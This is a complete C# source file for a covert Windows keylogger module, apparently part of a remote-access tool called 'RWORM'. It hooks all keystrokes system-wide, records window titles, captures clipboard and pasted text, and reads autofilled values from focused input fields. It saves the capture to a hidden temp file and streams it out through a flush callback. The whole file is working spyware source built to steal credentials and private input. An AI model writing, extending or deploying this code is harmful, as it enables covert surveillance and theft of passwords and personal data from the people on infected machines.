using System;
using System.Collections.Concurrent;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace RWORM.Client.Modules
{
    /// <summary>
    /// Robust low-level keyboard hook keylogger with:
    /// - Native ToUnicodeEx character resolution (supports Turkish/intl layouts, Shift, AltGr, dead keys)
    /// - Real-time Ctrl+V (paste) & clipboard monitoring
    /// - Focused input and browser autofill detection via native Win32 APIs
    /// - Non-blocking asynchronous I/O queue (prevents hook timeouts)
    /// - Pure C# implementation with zero WPF/WinForms dependencies for minimal binary size
    /// </summary>
    public class Keylogger : IDisposable
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN     = 0x0100;
        private const int WM_KEYUP       = 0x0101;
        private const int WM_SYSKEYDOWN  = 0x0104;
        private const int WM_SYSKEYUP    = 0x0105;
        private const uint WM_QUIT       = 0x0012;
        private const uint CF_UNICODETEXT = 13;
        private const uint WM_GETTEXT    = 0x000D;
        private const uint WM_GETTEXTLENGTH = 0x000E;

        [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, KeyboardProc cb, IntPtr mod, uint tid);
        [DllImport("user32.dll")] static extern bool   UnhookWindowsHookEx(IntPtr h);
        [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
        [DllImport("user32.dll")] static extern bool   GetMessage(out MSG m, IntPtr hwnd, uint min, uint max);
        [DllImport("user32.dll")] static extern bool   TranslateMessage(ref MSG m);
        [DllImport("user32.dll")] static extern IntPtr DispatchMessage(ref MSG m);
        [DllImport("user32.dll")] static extern bool   PostThreadMessage(uint tid, uint msg, IntPtr w, IntPtr l);
        [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] static extern int    GetWindowText(IntPtr h, StringBuilder s, int n);
        [DllImport("user32.dll")] static extern short  GetKeyState(int nVirtKey);
        [DllImport("user32.dll")] static extern bool   GetKeyboardState(byte[] lpKeyState);
        [DllImport("user32.dll")] static extern IntPtr GetKeyboardLayout(uint idThread);
        [DllImport("user32.dll")] static extern uint   GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
        [DllImport("user32.dll", SetLastError = true)]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll", SetLastError = true)] static extern bool OpenClipboard(IntPtr hWndNewOwner);
        [DllImport("user32.dll", SetLastError = true)] static extern bool CloseClipboard();
        [DllImport("user32.dll")] static extern IntPtr GetClipboardData(uint uFormat);
        [DllImport("user32.dll")] static extern uint   GetClipboardSequenceNumber();
        [DllImport("user32.dll", CharSet = CharSet.Auto)] static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, StringBuilder lParam);
        [DllImport("user32.dll", CharSet = CharSet.Auto)] static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
        [DllImport("user32.dll", CharSet = CharSet.Auto)] static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

        [StructLayout(LayoutKind.Sequential)]
        struct RECT { public int Left, Top, Right, Bottom; }

        [StructLayout(LayoutKind.Sequential)]
        struct GUITHREADINFO
        {
            public int cbSize;
            public int flags;
            public IntPtr hwndActive;
            public IntPtr hwndFocus;
            public IntPtr hwndCapture;
            public IntPtr hwndMenuOwner;
            public IntPtr hwndMoveSize;
            public IntPtr hwndCaret;
            public RECT rcCaret;
        }

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool GetGUIThreadInfo(uint idThread, ref GUITHREADINFO lpgui);

        [DllImport("kernel32.dll")] static extern IntPtr GlobalLock(IntPtr hMem);
        [DllImport("kernel32.dll")] static extern bool   GlobalUnlock(IntPtr hMem);
        [DllImport("kernel32.dll")] static extern uint   GetCurrentThreadId();

        delegate IntPtr KeyboardProc(int n, IntPtr w, IntPtr l);

        [StructLayout(LayoutKind.Sequential)]
        struct KBDLLHOOKSTRUCT { public int vkCode, scanCode, flags, time; public IntPtr extra; }

        [StructLayout(LayoutKind.Sequential)]
        struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam, lParam; public uint time; int x, y; }

        private KeyboardProc? _proc;
        private IntPtr        _hook = IntPtr.Zero;
        private Thread?       _hookThread;
        private Thread?       _workerThread;
        private Thread?       _autofillThread;
        private uint          _threadId;
        private readonly ConcurrentQueue<string> _queue = new();
        private readonly StringBuilder _buf = new();
        private readonly object _bufLock = new();
        private string _lastWindow = "";
        private string _lastClipboard = "";
        private string _lastAutofillVal = "";
        private uint   _lastClipSeq;
        private volatile bool _running;

        private bool _shift;
        private bool _ctrl;
        private bool _alt;
        private bool _caps;

        public static readonly string OfflineLogPath =
            Path.Combine(Path.GetTempPath(), "rworm_kl.dat");

        public Func<string, Task>? OnFlush { get; set; }
        public bool IsRunning => _running;

        public void Start(bool onlineMode)
        {
            if (_running) return;
            _running = true;

            // 1. Hook Thread (Windows Message Loop)
            _hookThread = new Thread(() =>
            {
                _threadId = GetCurrentThreadId();
                _proc     = HookProc;

                _hook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, IntPtr.Zero, 0);
                if (_hook == IntPtr.Zero)
                {
                    _hook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc,
                        Marshal.GetHINSTANCE(typeof(Keylogger).Module), 0);
                }

                while (_running && GetMessage(out var msg, IntPtr.Zero, 0, 0))
                {
                    TranslateMessage(ref msg);
                    DispatchMessage(ref msg);
                }

                if (_hook != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(_hook);
                    _hook = IntPtr.Zero;
                }
            });
            _hookThread.IsBackground = true;
            _hookThread.Start();

            // 2. Background I/O and Clipboard Monitor Worker Thread
            _workerThread = new Thread(() =>
            {
                try { _lastClipSeq = GetClipboardSequenceNumber(); } catch { }
                while (_running)
                {
                    CheckClipboardChange();

                    // Drain async entries to disk & stream buffer
                    if (!_queue.IsEmpty)
                    {
                        var chunk = new StringBuilder();
                        while (_queue.TryDequeue(out var item))
                        {
                            chunk.Append(item);
                        }
                        if (chunk.Length > 0)
                        {
                            string s = chunk.ToString();
                            lock (_bufLock) { _buf.Append(s); }
                            try { File.AppendAllText(OfflineLogPath, s); } catch { }
                        }
                    }

                    Thread.Sleep(50);
                }
            });
            _workerThread.IsBackground = true;
            _workerThread.Start();

            // 3. Native Win32 Active Control & Autofill Monitor
            _autofillThread = new Thread(() =>
            {
                while (_running)
                {
                    try
                    {
                        CheckActiveControlText();
                    }
                    catch { }
                    Thread.Sleep(800);
                }
            });
            _autofillThread.IsBackground = true;
            _autofillThread.Start();

            // 4. Online flusher loop
            if (onlineMode)
            {
                _ = Task.Run(async () =>
                {
                    while (_running)
                    {
                        await Task.Delay(1500);
                        string data;
                        lock (_bufLock)
                        {
                            data = _buf.ToString();
                            _buf.Clear();
                        }
                        if (!string.IsNullOrEmpty(data) && OnFlush != null)
                        {
                            try { await OnFlush(data); } catch { }
                        }
                    }
                });
            }
        }

        public void Stop()
        {
            if (!_running) return;
            _running = false;

            if (_threadId != 0)
                try { PostThreadMessage(_threadId, WM_QUIT, IntPtr.Zero, IntPtr.Zero); } catch { }

            _hookThread?.Join(1000);
            _workerThread?.Join(500);
            _autofillThread?.Join(500);
            _threadId = 0;
        }

        public string GetOfflineLog()
        {
            try { return File.Exists(OfflineLogPath) ? File.ReadAllText(OfflineLogPath) : "(empty)"; }
            catch { return "(read error)"; }
        }

        private IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int msg = (int)wParam;
                var kb = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
                int vk = kb.vkCode;

                if (msg == WM_KEYDOWN || msg == WM_SYSKEYDOWN)
                {
                    // Track modifiers
                    switch (vk)
                    {
                        case 0x10: case 0xA0: case 0xA1: _shift = true; return CallNextHookEx(_hook, nCode, wParam, lParam);
                        case 0x11: case 0xA2: case 0xA3: _ctrl  = true; return CallNextHookEx(_hook, nCode, wParam, lParam);
                        case 0x12: case 0xA4: case 0xA5: _alt   = true; return CallNextHookEx(_hook, nCode, wParam, lParam);
                        case 0x14: _caps = !_caps; return CallNextHookEx(_hook, nCode, wParam, lParam);
                    }

                    // Window title tracking
                    var sb = new StringBuilder(256);
                    var win = GetForegroundWindow();
                    GetWindowText(win, sb, 256);
                    string window = sb.ToString();

                    if (!string.IsNullOrEmpty(window) && window != _lastWindow)
                    {
                        _queue.Enqueue($"\r\n[{DateTime.Now:HH:mm:ss} — {window}]\r\n");
                        _lastWindow = window;
                    }

                    // Detect Ctrl+V (Paste) or Shift+Insert
                    if ((_ctrl && (vk == 0x56 || vk == 0x76)) || (_shift && vk == 0x2D))
                    {
                        string? clip = GetClipboardText();
                        if (!string.IsNullOrEmpty(clip))
                        {
                            _queue.Enqueue($"[Paste: \"{clip}\"]");
                        }
                        else
                        {
                            _queue.Enqueue("[Paste]");
                        }
                        return CallNextHookEx(_hook, nCode, wParam, lParam);
                    }

                    // Translate character via Win32 ToUnicodeEx
                    string charText = TranslateVk(vk, kb.scanCode, win);
                    if (!string.IsNullOrEmpty(charText))
                    {
                        _queue.Enqueue(charText);
                    }
                }
                else if (msg == WM_KEYUP || msg == WM_SYSKEYUP)
                {
                    switch (vk)
                    {
                        case 0x10: case 0xA0: case 0xA1: _shift = false; break;
                        case 0x11: case 0xA2: case 0xA3: _ctrl  = false; break;
                        case 0x12: case 0xA4: case 0xA5: _alt   = false; break;
                    }
                }
            }

            return CallNextHookEx(_hook, nCode, wParam, lParam);
        }

        private string TranslateVk(int vk, int scanCode, IntPtr hwnd)
        {
            switch (vk)
            {
                case 0x08: return "[BS]";
                case 0x09: return "[Tab]";
                case 0x0D: return "\r\n";
                case 0x1B: return "[Esc]";
                case 0x20: return " ";
                case 0x2E: return "[Del]";
                case 0x2D: return "[Ins]";
                case 0x25: return "[←]";
                case 0x26: return "[↑]";
                case 0x27: return "[→]";
                case 0x28: return "[↓]";
                case 0x24: return "[Home]";
                case 0x23: return "[End]";
                case 0x21: return "[PgUp]";
                case 0x22: return "[PgDn]";
                case 0x5B: case 0x5C: return "[Win]";
            }

            if (vk >= 0x70 && vk <= 0x87) return $"[F{vk - 0x6F}]";

            try
            {
                byte[] keyState = new byte[256];
                GetKeyboardState(keyState);

                if (_shift) { keyState[0x10] = 0x80; keyState[0xA0] = 0x80; }
                if (_ctrl)  { keyState[0x11] = 0x80; keyState[0xA2] = 0x80; }
                if (_alt)   { keyState[0x12] = 0x80; keyState[0xA4] = 0x80; }
                if (_caps)  keyState[0x14] = 0x01;

                uint threadId = GetWindowThreadProcessId(hwnd, out _);
                IntPtr layout = GetKeyboardLayout(threadId);

                var sb = new StringBuilder(16);
                int count = ToUnicodeEx((uint)vk, (uint)scanCode, keyState, sb, sb.Capacity, 0, layout);

                if (count > 0)
                {
                    return sb.ToString();
                }
            }
            catch { }

            if (vk >= 0x41 && vk <= 0x5A)
            {
                bool upper = _shift ^ _caps;
                return ((char)(upper ? vk : vk + 32)).ToString();
            }
            if (vk >= 0x30 && vk <= 0x39) return ((char)vk).ToString();
            if (vk >= 0x60 && vk <= 0x69) return ((char)('0' + vk - 0x60)).ToString();

            return "";
        }

        public static string? GetClipboardText()
        {
            if (!OpenClipboard(IntPtr.Zero)) return null;
            try
            {
                IntPtr hData = GetClipboardData(CF_UNICODETEXT);
                if (hData == IntPtr.Zero) return null;
                IntPtr pText = GlobalLock(hData);
                if (pText == IntPtr.Zero) return null;
                try
                {
                    return Marshal.PtrToStringUni(pText);
                }
                finally
                {
                    GlobalUnlock(hData);
                }
            }
            catch { return null; }
            finally
            {
                CloseClipboard();
            }
        }

        private void CheckClipboardChange()
        {
            try
            {
                uint seq = GetClipboardSequenceNumber();
                if (seq != _lastClipSeq)
                {
                    _lastClipSeq = seq;
                    string? text = GetClipboardText();
                    if (!string.IsNullOrEmpty(text) && text != _lastClipboard)
                    {
                        _lastClipboard = text;
                        _queue.Enqueue($"\r\n[Clipboard: \"{text}\"]\r\n");
                    }
                }
            }
            catch { }
        }

        /// <summary>
        /// Reads focused input text via Win32 GUI Thread Info.
        /// Captures autofilled or pasted values inside active edit controls without WPF.
        /// </summary>
        private void CheckActiveControlText()
        {
            try
            {
                var fg = GetForegroundWindow();
                if (fg == IntPtr.Zero) return;

                uint tid = GetWindowThreadProcessId(fg, out _);
                if (tid == 0) return;

                var gui = new GUITHREADINFO { cbSize = Marshal.SizeOf<GUITHREADINFO>() };
                if (!GetGUIThreadInfo(tid, ref gui)) return;

                IntPtr focus = gui.hwndFocus;
                if (focus == IntPtr.Zero) return;

                var className = new StringBuilder(64);
                GetClassName(focus, className, 64);
                string cls = className.ToString().ToLowerInvariant();

                if (cls.Contains("edit") || cls.Contains("textbox") || cls.Contains("rich"))
                {
                    int len = SendMessage(focus, WM_GETTEXTLENGTH, 0, 0);
                    if (len > 1 && len < 1024)
                    {
                        var textSb = new StringBuilder(len + 1);
                        SendMessage(focus, WM_GETTEXT, (IntPtr)(len + 1), textSb);
                        string val = textSb.ToString().Trim();
                        if (!string.IsNullOrEmpty(val) && val != _lastAutofillVal)
                        {
                            _lastAutofillVal = val;
                            _queue.Enqueue($"\r\n[Autofill/Field: \"{val}\"]\r\n");
                        }
                    }
                }
            }
            catch { }
        }

        public void Dispose() => Stop();
    }
}
